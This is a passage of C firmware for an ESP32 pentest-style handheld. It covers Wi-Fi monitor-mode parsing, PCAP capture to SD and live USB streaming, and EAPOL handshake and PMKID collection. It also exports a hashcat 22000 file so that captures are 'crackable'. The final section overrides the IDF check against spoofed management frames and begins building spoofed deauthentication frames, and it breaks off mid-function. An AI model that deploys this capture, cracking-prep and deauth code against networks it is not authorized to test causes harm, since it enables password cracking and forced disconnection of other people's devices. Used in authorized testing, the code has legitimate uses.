            sec = classify_rsn(v, tlen);
        } else if (tag == 221 && tlen >= 4 &&        /* vendor IE: WPA, 00-50-F2 type 1 */
                   v[0] == 0x00 && v[1] == 0x50 && v[2] == 0xF2 && v[3] == 0x01) {
            have_wpa = true;
        }
        off += 2 + tlen;
    }
    if (!have_rsn && have_wpa) sec = NOCSIF_WIFI_SEC_WPA;

    ap_upsert(bssid, ssid, hidden, channel, s->rssi, sec, s->ts_us,
              d + 36, len - 36);   /* raw IE region (after MAC hdr + fixed params) for the detail decoder */
}

/* The parser's drain task, a single consumer: decodes every published
 * slot and then releases the head. Idles on a short poll whenever the ring
 * is empty or parsing is off — kept simple, with no notification from the
 * callback. */
static void wifi_parse_task(void *arg)
{
    (void)arg;
    for (;;) {
        if (!s_parse_active || s_ring == NULL) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        uint32_t head = s_ring_head;                       /* the sole consumer */
        uint32_t tail = __atomic_load_n(&s_ring_tail, __ATOMIC_ACQUIRE);
        if (head == tail) {
            vTaskDelay(pdMS_TO_TICKS(20));                  /* an idle poll */
            continue;
        }
        while (head != tail) {
            parse_frame(&s_ring[head & (CAP_SLOTS - 1)]);
            head++;
        }
        __atomic_store_n(&s_ring_head, head, __ATOMIC_RELEASE);
    }
}

static void do_monitor_on(void)
{
    if (s_mon_active) {
        return;
    }
    if (!bring_up()) {
        return;
    }
    if (s_ap_active) { ap_teardown(); }               /* with only one radio, capture ends the AP */
    s_enabled = true;                                 /* capture powers the radio on */
    if (!ensure_started()) {
        return;
    }
    if (s_sta_started) {
        enter_promiscuous();
    } else {
        s_pending_monitor = true;                     /* STA_START will enter it */
        refresh_strings();
    }
}

static void do_monitor_off(void)
{
    if (!s_mon_active && !s_pending_monitor) {
        return;
    }
    bool was_active = s_mon_active;
    monitor_teardown();
    if (was_active && s_mon_prev_connected && s_ssid[0]) {   /* restores the link that was suspended */
        s_want_connect = true;
        s_retry = 0;
        s_auth_fail = false;
        s_join_state = NOCSIF_WIFI_JOIN_JOINING;
        apply_config();
        try_connect();
    }
    refresh_strings();
}

static void do_mon_hop(bool hop)
{
    s_mon_hop = hop;
    refresh_strings();
}

static void do_mon_chan(int ch)
{
    if (ch < 1)  ch = 1;
    if (ch > 13) ch = 13;
    s_mon_hop = false;                                /* picking a channel implies locking to it */
    s_mon_chan = ch;
    if (s_mon_active) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    refresh_strings();
}

/* Turns the passive parser on: makes sure capture is running (which
 * drops any STA link), lazily allocates the PSRAM copy-out ring, clears the
 * AP table, spins up the drain task once, then arms the rx callback's
 * copy-out. Idempotent while already parsing, so the ring is never reset
 * out from under the live producer. */
static void do_parse_on(void)
{
    if (s_parse_active) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {         /* capture is the source of frames: start it */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {         /* capture failed to come up: don't arm the parser */
        ESP_LOGW(TAG, "parser: capture did not start; not arming");
        return;
    }
    if (s_ring == NULL) {
        s_ring = heap_caps_malloc(sizeof(cap_slot_t) * CAP_SLOTS, MALLOC_CAP_SPIRAM);
        if (s_ring == NULL) {
            ESP_LOGE(TAG, "parser: ring alloc failed (%u B PSRAM)",
                     (unsigned)(sizeof(cap_slot_t) * CAP_SLOTS));
            return;
        }
    }
    s_ring_head = s_ring_tail = s_ring_drop = 0;       /* safe: the producer skips work while s_parse_active is 0 */

    /* Identity tables in PSRAM (off the scarce internal-DMA pool), allocated once and held for the
     * session. Parser task writes, LVGL getters read, all under s_ap_mux. If any alloc fails, don't arm
     * parsing — the getters stay empty (cnt=0) rather than deref a NULL table. */
    if (!s_mon_ap)    s_mon_ap    = heap_caps_calloc(MON_AP_MAX,    sizeof *s_mon_ap,    MALLOC_CAP_SPIRAM);
    if (!s_mon_sta)   s_mon_sta   = heap_caps_calloc(MON_STA_MAX,   sizeof *s_mon_sta,   MALLOC_CAP_SPIRAM);
    if (!s_mon_probe) s_mon_probe = heap_caps_calloc(MON_PROBE_MAX, sizeof *s_mon_probe, MALLOC_CAP_SPIRAM);
    if (!s_mon_hs)    s_mon_hs    = heap_caps_calloc(MON_HS_MAX,    sizeof *s_mon_hs,    MALLOC_CAP_SPIRAM);
    if (!s_mon_ap || !s_mon_sta || !s_mon_probe || !s_mon_hs) {
        ESP_LOGE(TAG, "parser: identity table alloc (PSRAM) failed");
        return;
    }

    portENTER_CRITICAL(&s_ap_mux);
    for (int i = 0; i < MON_AP_MAX; i++)    s_mon_ap[i].used    = false;
    for (int i = 0; i < MON_STA_MAX; i++)   s_mon_sta[i].used   = false;
    for (int i = 0; i < MON_PROBE_MAX; i++) s_mon_probe[i].used = false;
    for (int i = 0; i < MON_HS_MAX; i++)    s_mon_hs[i].used    = false;
    s_mon_ap_cnt = s_mon_sta_cnt = s_mon_probe_cnt = s_mon_hs_cnt = 0;
    s_mon_ap_gen++; s_mon_sta_gen++; s_mon_probe_gen++; s_mon_hs_gen++;
    portEXIT_CRITICAL(&s_ap_mux);

    if (s_parse_task == NULL) {
        /* RAM Phase A3: the four lazy WiFi workers (parser, PCAP writer,
         * handshake export, portal DNS) get PSRAM stacks. These are exactly the
         * transient internal claims that eroded the contiguous internal-DMA run
         * during Signal Hunt / capture (measured -9 KB in LoRa-hunt mode after
         * A2), and each is safe with the flash cache off: the parser reads the
         * PSRAM ring into BSS tables, the writers stream to SD over SPI (a
         * PSRAM-resident write buffer is bounced by sdspi's own internal block
         * buffer), and the DNS task only touches LWIP sockets — none of them
         * write NVS or internal flash from their own task (the pinned "wifi"
         * command worker owns every NVS write in this file). Deleted workers
         * use vTaskDeleteWithCaps. */
        if (xTaskCreateWithCaps(wifi_parse_task, "wifiparse", 3072, NULL, 3, &s_parse_task, MALLOC_CAP_SPIRAM) != pdPASS) {
            ESP_LOGE(TAG, "parser: task create failed");
            return;
        }
    }
    s_parse_active = true;
    ESP_LOGI(TAG, "parser on (nearby-AP list); int-dma free=%u",
             (unsigned)nocsif_int_dma_free());
}

static void do_parse_off(void)
{
    if (!s_parse_active) {
        return;
    }
    s_parse_active = false;
    ESP_LOGI(TAG, "parser off (%d APs seen, %u frames dropped)",
             s_mon_ap_cnt, (unsigned)s_ring_drop);
}

/* ---- PCAP capture to /sd (M5-P3.3) ---- *
 * A dedicated writer task owns the FILE*: it drains the all-frames ring and
 * appends each frame with a radiotap header. FAT I/O demands a large stack
 * — the lean parser task's 3072 B overflows inside fopen/fwrite, which is
 * exactly why this runs on its own 8 KB task. */

/* Our fixed 13-byte radiotap header: present flags are Channel (bit 3) plus dBm Antenna Signal (bit 5). */
static void pcap_build_radiotap(uint8_t rt[PCAP_RADIOTAP_LEN], uint8_t channel, int8_t rssi)
{
    int c = (channel >= 1 && channel <= 14) ? channel : 1;
    uint16_t freq = (c == 14) ? 2484 : (uint16_t)(2412 + (c - 1) * 5);
    rt[0] = 0; rt[1] = 0;                              /* it_version, it_pad */
    rt[2] = PCAP_RADIOTAP_LEN; rt[3] = 0;              /* it_len, little-endian */
    rt[4] = 0x28; rt[5] = 0; rt[6] = 0; rt[7] = 0;     /* it_present: Channel plus dBm signal */
    rt[8]  = (uint8_t)(freq & 0xFF);                   /* channel frequency, little-endian */
    rt[9]  = (uint8_t)(freq >> 8);
    rt[10] = 0x80; rt[11] = 0x00;                      /* channel flags: 2GHz */
    rt[12] = (uint8_t)rssi;                            /* dBm antenna signal, as an int8 */
}

/* Chooses the next free capture file. Assumes the /sd lock is already
 * held. The filename prefix reflects the active filter: cap-NNN for a full
 * capture, hs-NNN for an EAPOL key-exchange session. */
static void pcap_pick_path(char *out, size_t outlen)
{
    const char *pfx = (s_pcap_filter == PCAP_FILTER_EAPOL) ? "hs" : "cap";
    for (int i = 0; i < 1000; i++) {
        snprintf(out, outlen, "/sd/nocsif/wifi/%s-%03d.pcap", pfx, i);
        struct stat st;
        if (stat(out, &st) != 0) {
            return;                                    /* the first name that doesn't already exist */
        }
    }
    snprintf(out, outlen, "/sd/nocsif/wifi/%s-999.pcap", pfx);   /* fallback: just reuse the last one */
}

/* Opens the capture file: claims the card, creates the output
 * directories, and writes the PCAP global header. Returns the FILE* with
 * s_pcap_path and the counters set, or NULL with s_pcap_state describing
 * the failure. */
static FILE *pcap_open_file(void)
{
    esp_err_t ce = nocsif_usb_gadget_claim_sd(2000);
    if (ce != ESP_OK) {
        s_pcap_state = (ce == ESP_ERR_INVALID_STATE) ? PCAP_FILESHARE : PCAP_NOSD;
        ESP_LOGW(TAG, "pcap: claim_sd -> %s", esp_err_to_name(ce));
        return NULL;
    }
    if (!nocsif_sdcard_lock(3000)) {
        s_pcap_state = PCAP_ERR;
        ESP_LOGE(TAG, "pcap: /sd lock timeout");
        return NULL;
    }
    mkdir("/sd/nocsif", 0777);                         /* ignore EEXIST */
    mkdir("/sd/nocsif/wifi", 0777);
    pcap_pick_path(s_pcap_path, sizeof s_pcap_path);
    FILE *f = fopen(s_pcap_path, "wb");
    if (f == NULL) {
        ESP_LOGE(TAG, "pcap: fopen(%s) failed", s_pcap_path);
        nocsif_sdcard_unlock();
        s_pcap_state = PCAP_ERR;
        s_pcap_path[0] = '\0';
        return NULL;
    }
    /* PCAP global header, little-endian: magic a1b2c3d4, v2.4, zone 0, sig 0, snaplen, LINKTYPE=127. */
    uint8_t gh[24];
    uint32_t magic = 0xa1b2c3d4u, snaplen = PCAP_SNAP + PCAP_RADIOTAP_LEN, net = 127;
    memcpy(gh + 0, &magic, 4);
    gh[4] = 2; gh[5] = 0; gh[6] = 4; gh[7] = 0;        /* version_major 2, version_minor 4 */
    memset(gh + 8, 0, 8);                              /* thiszone plus sigfigs */
    memcpy(gh + 16, &snaplen, 4);
    memcpy(gh + 20, &net, 4);
    fwrite(gh, 1, sizeof gh, f);
    fflush(f);
    nocsif_sdcard_unlock();

    s_pcap_bytes  = sizeof gh;
    s_pcap_frames = 0;
    s_pcap_state  = PCAP_REC;
    ESP_LOGI(TAG, "pcap: recording -> %s", s_pcap_path);
    return f;
}

/* Appends one frame record: record header, radiotap header, then captured bytes. Assumes the lock is already held. */
static void pcap_write_record(FILE *f, const pcap_slot_t *s)
{
    uint8_t rt[PCAP_RADIOTAP_LEN];
    pcap_build_radiotap(rt, s->channel, s->rssi);

    uint32_t ts_sec  = (uint32_t)(s->ts_us / 1000000);
    uint32_t ts_usec = (uint32_t)(s->ts_us % 1000000);
    uint32_t incl = PCAP_RADIOTAP_LEN + s->cap_len;
    uint32_t orig = PCAP_RADIOTAP_LEN + s->orig_len;

    uint8_t rh[16];
    memcpy(rh + 0,  &ts_sec,  4);
    memcpy(rh + 4,  &ts_usec, 4);
    memcpy(rh + 8,  &incl,    4);
    memcpy(rh + 12, &orig,    4);
    fwrite(rh, 1, sizeof rh, f);
    fwrite(rt, 1, PCAP_RADIOTAP_LEN, f);
    fwrite(s->data, 1, s->cap_len, f);

    s_pcap_bytes  += sizeof rh + incl;
    s_pcap_frames++;
}

/* ---- CDC live-stream sink (M5-P5+) ---- *
 * The same PCAP byte layout as the SD file — one global header, then a
 * radiotap header and record per frame — but pushed to the host over
 * USB-CDC instead of written to /sd. A host tool (Wireshark, via the
 * bundled extcap) opens the port and reads a live capture. No /sd lock and
 * no FILE* involved — just the CDC TX ring. Bytes accepted by cdc_write are
 * already committed to the wire, so a record is always sent whole. */

/* Sends the whole buffer over CDC, looping past a full FIFO with
 * bounded flushes. A total stall — the host stopped reading — returns
 * false; the caller then re-emits a fresh global header on reconnect so the
 * stream re-frames cleanly. */
static bool pcap_cdc_send_all(const uint8_t *buf, size_t len)
{
    size_t off = 0;
    int    stalls = 0;
    while (off < len) {
        size_t n = nocsif_usb_gadget_cdc_write(buf + off, len - off);
        off += n;
        if (off < len) {
            nocsif_usb_gadget_cdc_flush(20);
            if (n == 0) {
                if (++stalls > 12) return false;       /* roughly 250ms of no progress means the host is gone */
            } else {
                stalls = 0;
            }
        }
    }
    return true;
}

/* Emits the PCAP global header to CDC, once per stream session. Mirrors pcap_open_file's own header. */
static bool pcap_cdc_header(void)
{
    uint8_t gh[24];
    uint32_t magic = 0xa1b2c3d4u, snaplen = PCAP_SNAP + PCAP_RADIOTAP_LEN, net = 127;
    memcpy(gh + 0, &magic, 4);
    gh[4] = 2; gh[5] = 0; gh[6] = 4; gh[7] = 0;        /* version_major 2, version_minor 4 */
    memset(gh + 8, 0, 8);                              /* thiszone plus sigfigs */
    memcpy(gh + 16, &snaplen, 4);
    memcpy(gh + 20, &net, 4);
    if (!pcap_cdc_send_all(gh, sizeof gh)) {
        return false;
    }
    nocsif_usb_gadget_cdc_flush(20);
    s_pcap_bytes = sizeof gh;
    return true;
}

/* Pushes one frame record — record header, radiotap header, captured bytes — to CDC, built contiguously so it's never split mid-flight. Returns false on a host stall, meaning the stream must restart. */
static bool pcap_cdc_record(const pcap_slot_t *s)
{
    uint8_t  rec[16 + PCAP_RADIOTAP_LEN + PCAP_SNAP];
    uint32_t ts_sec  = (uint32_t)(s->ts_us / 1000000);
    uint32_t ts_usec = (uint32_t)(s->ts_us % 1000000);
    uint16_t cap = (s->cap_len > PCAP_SNAP) ? PCAP_SNAP : s->cap_len;
    uint32_t incl = PCAP_RADIOTAP_LEN + cap;
    uint32_t orig = PCAP_RADIOTAP_LEN + s->orig_len;
    memcpy(rec + 0,  &ts_sec,  4);
    memcpy(rec + 4,  &ts_usec, 4);
    memcpy(rec + 8,  &incl,    4);
    memcpy(rec + 12, &orig,    4);
    pcap_build_radiotap(rec + 16, s->channel, s->rssi);
    memcpy(rec + 16 + PCAP_RADIOTAP_LEN, s->data, cap);
    size_t total = 16 + PCAP_RADIOTAP_LEN + cap;
    if (!pcap_cdc_send_all(rec, total)) {
        return false;
    }
    s_pcap_bytes += total;
    s_pcap_frames++;
    return true;
}

/* The single consumer of the PCAP ring, owning the whole sink's
 * lifecycle. The sink is chosen by s_pcap_sink before arming: SD writes a
 * file (opened on request, drained under the /sd lock, closed on stop); CDC
 * streams to the host's serial port (waits for a host, emits the header,
 * then drains to CDC). */
static void pcap_writer_task(void *arg)
{
    (void)arg;
    FILE *f = NULL;             /* the SD sink's FILE*, NULL while streaming to CDC instead */
    bool  cdc_open = false;     /* the CDC sink: whether the global header has been sent, and streaming is live */
    for (;;) {
        if (!s_pcap_want) {                            /* a stop was requested: tear down whichever sink is active */
            if (f) {                                   /* SD: flush and close */
                if (nocsif_sdcard_lock(2000)) { fflush(f); fclose(f); nocsif_sdcard_unlock(); }
                else                          { fclose(f); }
                f = NULL;
                ESP_LOGI(TAG, "pcap: closed (%u frames, %u bytes, %u dropped)",
                         (unsigned)s_pcap_frames, (unsigned)s_pcap_bytes, (unsigned)s_pcap_drop);
            }
            if (cdc_open) {                            /* CDC: flush whatever's queued */
                nocsif_usb_gadget_cdc_flush(50);
                cdc_open = false;
                ESP_LOGI(TAG, "pcap: stream stopped (%u frames, %u bytes, %u dropped)",
                         (unsigned)s_pcap_frames, (unsigned)s_pcap_bytes, (unsigned)s_pcap_drop);
            }
            s_pcap_active = false;
            if (s_pcap_state == PCAP_REC || s_pcap_state == PCAP_STREAM || s_pcap_state == PCAP_NOHOST) {
                s_pcap_state = PCAP_OFF;
            }
            s_pcap_idle = true;                        /* parked: pcap_stop_and_free may now delete this task */
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        s_pcap_idle = false;                           /* actively capturing: not safe to delete yet */

        if (s_pcap_sink == PCAP_SINK_CDC) {
            /* ---- CDC live stream (M5-P5+) ---- */
            bool ready = nocsif_usb_gadget_cdc_ready();
            if (cdc_open && !ready) {                   /* the host went away, even while idle; the next
                                                        * host must get a fresh global header */
                cdc_open = false;
                s_pcap_active = false;
                s_pcap_state  = PCAP_NOHOST;
            }
            if (!cdc_open) {
                if (!ready) {                          /* CDC isn't enumerated, or no host is reading yet */
                    s_pcap_state  = PCAP_NOHOST;
                    s_pcap_active = false;             /* don't fill the ring until a host is actually present */
                    vTaskDelay(pdMS_TO_TICKS(200));
                    continue;
                }
                if (!pcap_cdc_header()) {              /* the host vanished mid-header: retry */
                    vTaskDelay(pdMS_TO_TICKS(200));
                    continue;
                }
                s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* a fresh ring for this session */
                s_pcap_frames = 0;
                s_pcap_active = true;                  /* now the rx callback fills the ring */
                s_pcap_state  = PCAP_STREAM;
                cdc_open = true;
            }
            uint32_t head = s_pcap_head;               /* the sole consumer */
            uint32_t tail = __atomic_load_n(&s_pcap_tail, __ATOMIC_ACQUIRE);
            if (head == tail) {
                nocsif_usb_gadget_cdc_flush(10);
                vTaskDelay(pdMS_TO_TICKS(15));         /* an idle poll */
                continue;
            }
            int  budget = 24;
            bool ok = true;
            while (head != tail && budget-- > 0) {
                if (!pcap_cdc_record(&s_pcap_ring[head & (PCAP_SLOTS - 1)])) { ok = false; break; }
                head++;
            }
            __atomic_store_n(&s_pcap_head, head, __ATOMIC_RELEASE);
            nocsif_usb_gadget_cdc_flush(20);
            if (!ok) {                                 /* the host stalled: restart cleanly on reconnect */
                cdc_open = false;
                s_pcap_active = false;
                s_pcap_state  = PCAP_NOHOST;
            }
            continue;
        }

        /* ---- SD file (P3.3, unchanged) ---- */
        if (f == NULL) {                               /* a start was requested: open the file */
            f = pcap_open_file();
            if (f == NULL) {                           /* open failed: give up on this session */
                s_pcap_want = false;
                s_pcap_active = false;
                vTaskDelay(pdMS_TO_TICKS(100));
                continue;
            }
            s_pcap_head = s_pcap_tail = s_pcap_drop = 0;   /* a fresh ring; the producer stays idle until it's active */
            s_pcap_active = true;                       /* now the rx callback fills the ring */
        }

        uint32_t head = s_pcap_head;                    /* the sole consumer */
        uint32_t tail = __atomic_load_n(&s_pcap_tail, __ATOMIC_ACQUIRE);
        if (head == tail) {
            vTaskDelay(pdMS_TO_TICKS(50));              /* an idle poll */
            continue;
        }
        /* Drains in bounded batches, so the /sd lock is never held through a full-ring burst. */
        if (nocsif_sdcard_lock(1000)) {
            int budget = 24;
            while (head != tail && budget-- > 0) {
                pcap_write_record(f, &s_pcap_ring[head & (PCAP_SLOTS - 1)]);
                head++;
            }
            fflush(f);
            nocsif_sdcard_unlock();
            __atomic_store_n(&s_pcap_head, head, __ATOMIC_RELEASE);
        } else {
            vTaskDelay(pdMS_TO_TICKS(20));              /* the lock is busy: retry shortly */
        }
    }
}

/* Allocates the PCAP ring lazily in PSRAM, spawns the big-stack writer
 * task, then arms it. Shared by both the SD recorder and the CDC live
 * stream — the caller picks s_pcap_sink first. Returns false on an
 * allocation or task-create failure, leaving the state at PCAP_ERR. The
 * 6144-byte stack matches the ducky FATFS reader's; the task only exists
 * while a session is armed, and is freed on stop by pcap_stop_and_free. */
static bool pcap_arm_writer(void)
{
    if (s_pcap_ring == NULL) {
        s_pcap_ring = heap_caps_malloc(sizeof(pcap_slot_t) * PCAP_SLOTS, MALLOC_CAP_SPIRAM);
        if (s_pcap_ring == NULL) {
            ESP_LOGE(TAG, "pcap: ring alloc failed (%u B PSRAM)",
                     (unsigned)(sizeof(pcap_slot_t) * PCAP_SLOTS));
            s_pcap_state = PCAP_ERR;
            return false;
        }
    }
    s_pcap_frames = s_pcap_bytes = s_pcap_drop = 0;
    if (s_pcap_task == NULL) {
        s_pcap_idle = false;
        if (xTaskCreateWithCaps(pcap_writer_task, "wifipcap", 6144, NULL, 3, &s_pcap_task, MALLOC_CAP_SPIRAM) != pdPASS) {
            ESP_LOGE(TAG, "pcap: writer task create failed (PSRAM stack — A3)");
            s_pcap_state = PCAP_ERR;
            s_pcap_idle = true;
            return false;
        }
    }
    s_pcap_want = true;                                 /* the writer opens the sink and arms the copy-out */
    return true;
}

static void do_pcap_on(void)
{
    if (s_pcap_want) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* capture is the frame source: start it */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "pcap: capture did not start; not recording");
        s_pcap_state = PCAP_ERR;
        return;
    }
    s_pcap_sink = PCAP_SINK_SD;                          /* record to a file on the card */
    pcap_arm_writer();
}

/* Live-PCAP over USB-CDC (M5-P5+): streams captured frames to the host
 * serial port for real-time Wireshark viewing (via the bundled extcap)
 * instead of writing a file. Auto-requests CDC gadget mode as the transport
 * and starts monitor mode as the source; the writer then waits for a host
 * to open the port (DTR) before actually emitting the PCAP stream. Shares
 * the single ring/writer with the file recorder, so it's refused while any
 * capture session is already active. Runs on the wifi worker, serialized
 * with do_pcap_*. */
static void do_pcap_stream_on(void)
{
    if (s_pcap_want) {
        ESP_LOGW(TAG, "pcap: a capture session is already active; ignoring stream request");
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    if (!s_mon_active && !s_pending_monitor) {          /* capture is the frame source: start it */
        do_monitor_on();
    }
    if (!s_mon_active && !s_pending_monitor) {
        ESP_LOGW(TAG, "pcap: capture did not start; not streaming");
        s_pcap_state = PCAP_ERR;
        return;
    }
    nocsif_usb_gadget_request_mode(NOCSIF_USB_MODE_CDC); /* the transport: enumerate CDC to the host */
    s_pcap_sink   = PCAP_SINK_CDC;
    s_pcap_filter = PCAP_FILTER_FULL;
    s_pcap_state  = PCAP_NOHOST;                         /* wait until a host opens the port */
    if (!pcap_arm_writer()) {
        s_pcap_sink = PCAP_SINK_SD;                      /* arming failed: restore the default sink */
    }
}

/* Stops recording and reclaims the writer task's internal-RAM stack.
 * Runs on the wifi worker, which also runs do_pcap_on, so the create/delete
 * lifecycle is serialized and there's no race with a restart. Waits, with a
 * bound, for the writer to close its file and park before deleting it, so a
 * task is never deleted mid-fwrite or while it holds the /sd lock. */
static void pcap_stop_and_free(void)
{
    s_pcap_want   = false;                              /* the writer flushes and closes, then parks */
    s_pcap_active = false;                              /* the producer (rx callback) stops immediately */
    if (s_pcap_task) {
        for (int i = 0; i < 80 && !s_pcap_idle; i++) {  /* up to roughly 2s for the file to close and park */
            vTaskDelay(pdMS_TO_TICKS(25));
        }
        vTaskDeleteWithCaps(s_pcap_task);               /* pairs with xTaskCreateWithCaps: frees the PSRAM stack and TCB */
        s_pcap_task = NULL;
    }
    if (s_pcap_state == PCAP_REC || s_pcap_state == PCAP_STREAM || s_pcap_state == PCAP_NOHOST) {
        s_pcap_state = PCAP_OFF;
    }
}

static void do_pcap_stream_off(void)
{
    pcap_stop_and_free();
    s_pcap_sink = PCAP_SINK_SD;                          /* restores the file sink, ready for the next Record */
}

static void do_pcap_off(void)
{
    pcap_stop_and_free();
}

/* Arms the shared PCAP writer in EAPOL-filter mode (M5-P4.1), recording
 * the key exchange and naming frames to hs-NNN.pcap. Refused if the writer
 * is already recording, since only one file can be active at a time — the
 * full and EAPOL sessions share one ring and task. Runs on the wifi worker,
 * serialized with do_pcap_*. */
static void do_hs_capture_on(void)
{
    if (s_pcap_want) {                                  /* a session is already recording */
        ESP_LOGW(TAG, "hs: capture already recording; ignoring");
        return;
    }
    s_pcap_filter = PCAP_FILTER_EAPOL;
    do_pcap_on();
    if (!s_pcap_want) {                                 /* start failed: restore the default filter */
        s_pcap_filter = PCAP_FILTER_FULL;
    }
}

/* ---- hc22000 export (M5 passive polish) ---- *
 * Turns the captured PMKIDs and 4-way handshakes into a hashcat-22000 file
 * on /sd, so a capture is crackable without the usual PC-side
 * hcxpcapngtool step. A one-shot dedicated big-stack task snapshots the
 * key-exchange table (per-entry, under the lock), writes WPA*01 (PMKID) and
 * WPA*02 (handshake) lines, then self-deletes. Reuses the same app-owned-/sd
 * claim and lock discipline as the PCAP writer. */
typedef enum { HC_IDLE = 0, HC_BUSY, HC_DONE, HC_NOSD, HC_FILESHARE, HC_ERR } hc_state_t;
static volatile int  s_hc_state = HC_IDLE;
static volatile int  s_hc_lines;
static volatile bool s_hc_running;
static char          s_hc_path[64];

/* Appends n bytes of `src` as lowercase hex into dst, bounded by cap; returns the number of characters written. */
static int hexcat(char *dst, int cap, const uint8_t *src, int n)
{
    static const char h[] = "0123456789abcdef";
    int w = 0;
    for (int i = 0; i < n && w + 2 < cap; i++) {
        dst[w++] = h[src[i] >> 4];
        dst[w++] = h[src[i] & 0x0F];
    }
    if (w < cap) dst[w] = '\0';
    return w;
}

static void hc_export_task(void *arg)
{
    (void)arg;
    esp_err_t ce = nocsif_usb_gadget_claim_sd(2000);
    if (ce != ESP_OK) {
        s_hc_state = (ce == ESP_ERR_INVALID_STATE) ? HC_FILESHARE : HC_NOSD;
        s_hc_running = false;
        vTaskDeleteWithCaps(NULL);
        return;
    }
    if (!nocsif_sdcard_lock(3000)) {
        s_hc_state = HC_ERR; s_hc_running = false; vTaskDeleteWithCaps(NULL); return;
    }
    mkdir("/sd/nocsif", 0777);
    mkdir("/sd/nocsif/wifi", 0777);
    snprintf(s_hc_path, sizeof s_hc_path, "/sd/nocsif/wifi/nocsif.hc22000");
    FILE *f = fopen(s_hc_path, "w");
    if (f == NULL) {
        nocsif_sdcard_unlock(); s_hc_state = HC_ERR; s_hc_path[0] = '\0';
        s_hc_running = false; vTaskDeleteWithCaps(NULL); return;
    }

    int cnt;
    portENTER_CRITICAL(&s_ap_mux);
    cnt = s_mon_hs_cnt;
    portEXIT_CRITICAL(&s_ap_mux);

    int lines = 0;
    for (int i = 0; i < cnt; i++) {
        mon_hs_t e;
        char ssid[WIFI_SSID_MAX]; ssid[0] = '\0';
        bool ok;
        portENTER_CRITICAL(&s_ap_mux);
        ok = (i < s_mon_hs_cnt && s_mon_hs[i].used);
        if (ok) {
            e = s_mon_hs[i];
            for (int j = 0; j < s_mon_ap_cnt; j++) {   /* resolves the ESSID from the AP table */
                if (s_mon_ap[j].used && memcmp(s_mon_ap[j].bssid, e.bssid, 6) == 0) {
                    memcpy(ssid, s_mon_ap[j].ssid, sizeof ssid);
                    break;
                }
            }
        }
        portEXIT_CRITICAL(&s_ap_mux);
        if (!ok || !e.have_sta) {
            continue;
        }
        int slen = (int)strlen(ssid);

        char line[600];
        if (e.has_pmkid) {                             /* the format WPA*01*pmkid*apmac*stamac*essid*** */
            int p = 0;
            p += snprintf(line + p, sizeof line - p, "WPA*01*");
            p += hexcat(line + p, sizeof line - p, e.pmkid, 16); p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.bssid, 6);  p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.sta, 6);    p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, (const uint8_t *)ssid, slen);
            p += snprintf(line + p, sizeof line - p, "***\n");
            fwrite(line, 1, p, f); lines++;
        }
        if (e.have_anonce && e.have_mic && e.eapol_len > 0) {   /* the format WPA*02*mic*ap*sta*essid*anonce*eapol*mp */
            int p = 0;
            p += snprintf(line + p, sizeof line - p, "WPA*02*");
            p += hexcat(line + p, sizeof line - p, e.mic, 16);    p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.bssid, 6);   p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.sta, 6);     p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, (const uint8_t *)ssid, slen); p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.anonce, 32); p += snprintf(line + p, sizeof line - p, "*");
            p += hexcat(line + p, sizeof line - p, e.eapol, e.eapol_len);        p += snprintf(line + p, sizeof line - p, "*");
            p += snprintf(line + p, sizeof line - p, "00\n");     /* messagepair: M1+M2, the challenge from M1, the EAPOL from M2 */
            fwrite(line, 1, p, f); lines++;
        }
    }

    fflush(f); fclose(f);
    nocsif_sdcard_unlock();
    s_hc_lines = lines;
    s_hc_state = (lines > 0) ? HC_DONE : HC_IDLE;      /* nothing to export: go back to idle */
    s_hc_running = false;
    ESP_LOGI(TAG, "hc22000: wrote %d line(s) -> %s", lines, s_hc_path);
    vTaskDeleteWithCaps(NULL);
}

static void do_export_hc(void)
{
    if (s_hc_running) {
        return;
    }
    if (nocsif_reliability_safe_mode()) {
        return;
    }
    s_hc_running = true;
    s_hc_state   = HC_BUSY;
    s_hc_lines   = 0;
    if (xTaskCreateWithCaps(hc_export_task, "wifihc", 6144, NULL, 3, NULL, MALLOC_CAP_SPIRAM) != pdPASS) {
        s_hc_running = false;
        s_hc_state   = HC_ERR;
        ESP_LOGE(TAG, "hc22000: export task create failed");
    }
}

/* ---- management-frame TX (M5-P5.1, active — authorized testing) ---- *
 * The first active WiFi operation: transmits spoofed-source
 * deauthentication or disassociation frames to solicit a reconnect (which
 * feeds the P4.1 handshake capture) or to exercise the P4.2 detectors,
 * under an authorized test. IDF's raw-TX path runs esp_wifi_80211_tx()
 * through the weak library function
 * ieee80211_raw_frame_sanity_check(), whose default implementation rejects
 * spoofed management frames; defining a strong override below permits the
 * transmission this feature actually needs. */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    return 0;                                          /* allows raw management-frame TX */
}

/* Builds and sends one deauth/disassoc frame: a 24-byte header plus a
 * 2-byte reason code. addr1 is the destination, addr2 the source (spoofing
 * the AP), addr3 the BSSID. For a specific client this also sends the
 * reverse direction, so both ends drop the association; a broadcast
 * destination (all-FF) only needs the AP-to-client direction. */
static void mgmt_tx_fire(void)
{
    if (!s_tx_active || !s_mon_active || !s_tx_have_target) {
        return;
    }
    uint8_t f[26];
    f[0] = s_tx_disassoc ? 0xA0 : 0xC0;                /* management subtype 10 (disassoc) or 12 (deauth) */
    f[1] = 0x00;
